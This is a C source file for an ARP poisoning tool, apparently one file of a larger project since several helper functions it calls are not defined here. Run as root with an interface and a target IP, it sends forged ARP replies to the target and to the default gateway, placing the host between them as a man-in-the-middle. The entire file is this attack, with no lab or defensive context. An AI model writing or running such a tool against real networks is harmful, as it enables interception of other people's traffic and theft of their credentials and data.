#include <stdio.h>
#include <unistd.h>
#include <dnet.h>
#include <string.h>
#include <stdlib.h>
#include "pcap.h"

void arpPoison(struct addr* targetIp, struct addr* recordIp, struct addr* recordHw){
    pcap_t* cap = setPromiscuous(Settings.device,"arp");

    printf("making arp packet...\n");
    struct addr targetHw;
    getMacAddress(targetIp, &targetHw);
    uint8_t* arp = getArpPacket(NULL,
            ARP_REPLY,
            (uint8_t*)&recordHw->addr_eth,
            recordIp->addr_ip,
            (uint8_t*)&targetHw.addr_eth,
            targetIp->addr_ip
            );



    printf("sending arp packet...\n");

    pcap_inject(cap, arp, ETHER_H_SIZE + ARP_H_SIZE);
}

void initHost(char* device){
    if (getuid() != 0){
        printf("Must be root.\n");    
        exit(1);
    }
    getHostHw(&Settings.hostHw, device);
    getHostIp(&Settings.hostIp, device);
    getDefaultGatewayHw(&Settings.defaultHw);
    getDefaultGatewayIp(&Settings.defaultIp);

    Settings.device = device;
}


int main(int argc, char* argv[]){
   if (argc < 3){
        printf("usage: ./%s <interface> <target ip>\n", argv[0]);
        return 1;
    }
    struct addr targetIp;
    initHost(argv[1]);
    addr_pton(argv[2], &targetIp);

    printf("poisoning target %s...\n", argv[2]);
    arpPoison(  &targetIp,
                &Settings.defaultIp,
                &Settings.hostHw);

    printf("poisoning gateway %s...\n", addr_ntoa(&Settings.defaultIp));
    arpPoison(  &Settings.defaultIp,
                &targetIp,
                &Settings.hostHw);

    return 0;
}


